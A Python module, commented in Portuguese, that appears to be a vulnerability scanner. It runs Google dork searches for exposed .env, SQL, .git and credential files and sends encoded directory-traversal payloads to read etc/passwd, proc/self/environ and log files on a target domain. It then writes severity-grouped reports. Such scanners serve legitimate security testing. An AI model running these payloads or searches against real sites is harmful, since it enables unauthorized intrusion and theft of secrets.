"""
Módulo de detecção de vulnerabilidades usando Google Dorks

Funcionalidades:
- Scan avançado usando Google Dorks
- Detecção de dados sensíveis expostos
- Identificação de Directory Traversal
- Classificação automática de gravidade
- Geração de relatórios detalhados
"""

import requests
import os
import logging
from urllib.parse import urlparse, quote
from typing import List, Dict, Tuple, Optional
from datetime import datetime

# Configuração de logging
logging.basicConfig(
    filename='dork_scan.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    encoding='utf-8'
)

# Configurações da API (deve ser movida para configuração externa em produção)
API_CONFIG = {
    "search_url": "https://google.serper.dev/search",
    "timeout": 15,
    "max_retries": 3
}

# Lista de Google Dorks organizadas por categoria e gravidade
DORKS: List[Tuple[str, str, str]] = [
    # (dork, descrição, gravidade)
    ("filetype:env", "Arquivos de ambiente expostos", "Crítica"),
    ("filetype:sql", "Arquivos SQL expostos", "Crítica"),
    ("filetype:log", "Arquivos de log expostos", "Alta"),
    ("ext:php intitle:phpinfo \"published by the PHP Group\"", "PHP Info exposto", "Crítica"),
    ("inurl:config", "Arquivos de configuração expostos", "Crítica"),
    ("inurl:.git", "Diretório .git exposto", "Crítica"),
    ("intitle:index.of passwd", "Arquivo de senhas exposto", "Crítica"),
    ("inurl:wp-content", "Conteúdo do WordPress exposto", "Média"),
    ("inurl:admin", "Painel administrativo exposto", "Alta"),
    ("inurl:login", "Página de login exposta", "Média"),
    ("inurl:signup", "Página de registro exposta", "Média"),
    ("inurl:dashboard", "Dashboard exposto", "Alta"),
    ("inurl:panel", "Painel de controle exposto", "Alta"),
    ("intitle:\"Index of /private\"", "Diretório privado indexado", "Alta"),
    ("intitle:\"Index of /backup\"", "Backups indexados", "Alta"),
    ("intitle:\"Index of /db\"", "Banco de dados indexado", "Crítica"),
    ("intitle:\"Index of /config\"", "Configurações indexadas", "Crítica"),
    ("inurl:phpmyadmin", "phpMyAdmin exposto", "Crítica"),
    ("intitle:\"phpinfo()\" \"published by the PHP Group\"", "PHP Info exposto", "Crítica"),
    ("inurl:credentials", "Credenciais expostas", "Crítica"),
    ("inurl:auth", "Autenticação exposta", "Alta")
]

# Termos sensíveis para busca de dados expostos
SENSITIVE_TERMS: List[Tuple[str, str]] = [
    ("password", "Senhas expostas"),
    ("secret", "Segredos expostos"),
    ("apikey", "Chaves de API expostas"),
    ("token", "Tokens de acesso expostos"),
    ("passwd", "Arquivos de senhas expostos"),
    ("credentials", "Credenciais expostas"),
    ("confidential", "Documentos confidenciais expostos"),
    ("private_key", "Chaves privadas expostas"),
    ("database", "Credenciais de banco de dados expostas")
]

# Payloads para Directory Traversal
TRAVERSAL_PAYLOADS: List[Tuple[str, str]] = [
    ("../", "Padrão básico de travessia"),
    ("..%2f", "Codificação URL"),
    ("..%252f", "Dupla codificação URL"),
    ("..%c0%af", "Codificação Unicode"),
    ("..\\", "Escape para Windows"),
    ("..\\\\", "Escape duplo para Windows"),
    ("%2e%2e%2f", "Codificação alternativa"),
    ("%2e%2e/", "Codificação parcial"),
    ("%252e%252e%255c", "Codificação complexa"),
    ("..%5c", "Codificação de barra invertida"),
    ("..%5c%5c", "Codificação dupla de barra invertida"),
    ("....//", "Tentativa de bypass"),
    ("....//..", "Tentativa de bypass aninhada")
]

# Arquivos sensíveis para testar Directory Traversal
SENSITIVE_FILES: List[Tuple[str, str]] = [
    ("etc/passwd", "Arquivo de usuários do sistema"),
    ("etc/hosts", "Arquivo de hosts do sistema"),
    ("var/log/auth.log", "Log de autenticação"),
    ("var/log/apache2/access.log", "Log de acesso Apache"),
    ("var/log/apache2/error.log", "Log de erro Apache"),
    ("proc/self/environ", "Variáveis de ambiente do processo"),
    ("boot/grub/grub.cfg", "Configuração do GRUB"),
    ("windows/win.ini", "Arquivo de configuração Windows"),
    ("php.ini", "Configuração do PHP")
]

# Falsos positivos comuns para filtrar resultados
FALSE_POSITIVES = [
    "template", "documentation", "demo", "github", "example", 
    "sample", "test", "mock", "placeholder"
]

class DorkScanner:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            "X-API-KEY": self.api_key,
            "Content-Type": "application/json"
        })
    
    def query_dork(self, query: str) -> Optional[List[Dict]]:
        """
        Executa uma consulta de Google Dork via API
        :param query: Consulta a ser executada
        :return: Lista de resultados ou None em caso de erro
        """
        data = {"q": query}
        
        for attempt in range(API_CONFIG["max_retries"]):
            try:
                response = self.session.post(
                    API_CONFIG["search_url"],
                    json=data,
                    timeout=API_CONFIG["timeout"]
                )
                
                if response.status_code == 200:
                    return response.json().get("organic", [])
                
                logging.warning(f"Erro na API (tentativa {attempt + 1}): {response.status_code}")
                
            except requests.exceptions.RequestException as e:
                logging.error(f"Erro na requisição (tentativa {attempt + 1}): {str(e)}")
        
        return None
    
    def is_false_positive(self, text: str) -> bool:
        """
        Verifica se um resultado é provavelmente um falso positivo
        :param text: Texto a ser verificado
        :return: True se for falso positivo, False caso contrário
        """
        text = text.lower()
        return any(fp in text for fp in FALSE_POSITIVES)
    
    def scan_dorks(self, domain: str) -> List[Dict[str, str]]:
        """
        Executa scan de Google Dorks em um domínio
        :param domain: Domínio alvo
        :return: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        logging.info(f"Iniciando scan de Google Dorks em {domain}")
        
        for dork, description, severity in DORKS:
            full_query = f"site:{domain} {dork}"
            logging.info(f"Testando dork: {full_query}")
            
            results = self.query_dork(full_query)
            if not results:
                continue
                
            for result in results:
                if self.is_false_positive(result.get("snippet", "")):
                    continue
                    
                vuln = {
                    "type": "Google Dork Exposure",
                    "severity": severity,
                    "details": f"{description} encontrado",
                    "url": result.get("link", ""),
                    "context": result.get("title", "") + " " + result.get("snippet", ""),
                    "dork": dork
                }
                vulnerabilities.append(vuln)
                logging.warning(f"Vulnerabilidade encontrada: {vuln}")
        
        logging.info(f"Scan de Dorks concluído. Vulnerabilidades encontradas: {len(vulnerabilities)}")
        return vulnerabilities
    
    def scan_sensitive_data(self, domain: str) -> List[Dict[str, str]]:
        """
        Procura por dados sensíveis expostos no domínio
        :param domain: Domínio alvo
        :return: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        logging.info(f"Iniciando scan de dados sensíveis em {domain}")
        
        for term, description in SENSITIVE_TERMS:
            full_query = f"site:{domain} intext:{term}"
            logging.info(f"Buscando termo sensível: {term}")
            
            results = self.query_dork(full_query)
            if not results:
                continue
                
            for result in results:
                if self.is_false_positive(result.get("snippet", "")):
                    continue
                    
                vuln = {
                    "type": "Sensitive Data Exposure",
                    "severity": "Alta",
                    "details": f"{description} com termo '{term}'",
                    "url": result.get("link", ""),
                    "context": result.get("title", "") + " " + result.get("snippet", ""),
                    "term": term
                }
                vulnerabilities.append(vuln)
                logging.warning(f"Dado sensível exposto: {vuln}")
        
        logging.info(f"Scan de dados sensíveis concluído. Exposições encontradas: {len(vulnerabilities)}")
        return vulnerabilities
    
    def scan_traversal(self, domain: str) -> List[Dict[str, str]]:
        """
        Testa vulnerabilidades de Directory Traversal
        :param domain: Domínio alvo
        :return: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        logging.info(f"Iniciando scan de Directory Traversal em {domain}")
        
        for payload, payload_desc in TRAVERSAL_PAYLOADS:
            for file, file_desc in SENSITIVE_FILES:
                test_url = f"http://{domain}/{payload}{file}"
                logging.info(f"Testando: {test_url}")
                
                try:
                    response = requests.get(
                        test_url,
                        timeout=API_CONFIG["timeout"],
                        allow_redirects=False
                    )
                    
                    if response.status_code == 200:
                        # Padrões que indicam sucesso
                        indicators = {
                            "etc/passwd": "root:",
                            "etc/hosts": "localhost",
                            ".log": "GET /",
                            ".ini": "[section]",
                            "php.ini": "[PHP]"
                        }
                        
                        content = response.text
                        indicator = next(
                            (ind for f, ind in indicators.items() if f in file),
                            None
                        )
                        
                        if indicator and indicator in content:
                            vuln = {
                                "type": "Directory Traversal",
                                "severity": "Crítica",
                                "details": f"{file_desc} acessível via {payload_desc}",
                                "url": test_url,
                                "file": file,
                                "payload": payload
                            }
                            vulnerabilities.append(vuln)
                            logging.warning(f"Vulnerabilidade de traversal encontrada: {vuln}")
                            
                except requests.exceptions.RequestException as e:
                    logging.error(f"Erro ao testar {test_url}: {str(e)}")
        
        logging.info(f"Scan de Directory Traversal concluído. Vulnerabilidades encontradas: {len(vulnerabilities)}")
        return vulnerabilities

def save_report(domain: str, vulnerabilities: List[Dict[str, str]], report_type: str) -> str:
    """
    Salva um relatório de vulnerabilidades em arquivo
    :param domain: Domínio analisado
    :param vulnerabilities: Lista de vulnerabilidades
    :param report_type: Tipo de relatório
    :return: Caminho do arquivo gerado
    """
    report_dir = "relatorios"
    os.makedirs(report_dir, exist_ok=True)
    
    safe_domain = domain.replace('.', '_').replace(':', '_')
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(report_dir, f"{report_type}_{safe_domain}_{timestamp}.txt")
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Relatório de {report_type.replace('_', ' ').title()}\n")
            f.write(f"Domínio: {domain}\n")
            f.write(f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            if not vulnerabilities:
                f.write("Nenhuma vulnerabilidade encontrada.\n")
            else:
                # Agrupar por gravidade
                by_severity = {}
                for vuln in vulnerabilities:
                    by_severity.setdefault(vuln['severity'], []).append(vuln)
                
                # Ordenar por gravidade
                for severity in ["Crítica", "Alta", "Média", "Baixa"]:
                    if severity in by_severity:
                        f.write(f"\n=== {severity.upper()} ===\n\n")
                        for vuln in by_severity[severity]:
                            f.write(f"[{vuln['type']}]\n")
                            f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                            f.write(f"Detalhes: {vuln['details']}\n")
                            if 'context' in vuln:
                                f.write(f"Contexto: {vuln['context'][:200]}...\n")
                            f.write("\n")
        
        logging.info(f"Relatório salvo em {filename}")
        return filename
    except Exception as e:
        logging.error(f"Erro ao salvar relatório: {str(e)}")
        raise

# Exemplo de uso:
if __name__ == "__main__":
    # Configuração (em produção, carregar de variáveis de ambiente/arquivo de configuração)
    API_KEY = "sua_api_key_aqui"  # Substituir pela chave real
    
    scanner = DorkScanner(API_KEY)
    domain = "exemplo.com"
    
    # Executar scans
    dork_results = scanner.scan_dorks(domain)
    sensitive_data_results = scanner.scan_sensitive_data(domain)
    traversal_results = scanner.scan_traversal(domain)
    
    # Consolidar resultados
    all_results = dork_results + sensitive_data_results + traversal_results
    
    # Gerar relatório
    if all_results:
        report_path = save_report(domain, all_results, "dork_scan")
        print(f"Relatório gerado em: {report_path}")
    else:
        print("Nenhuma vulnerabilidade encontrada.")
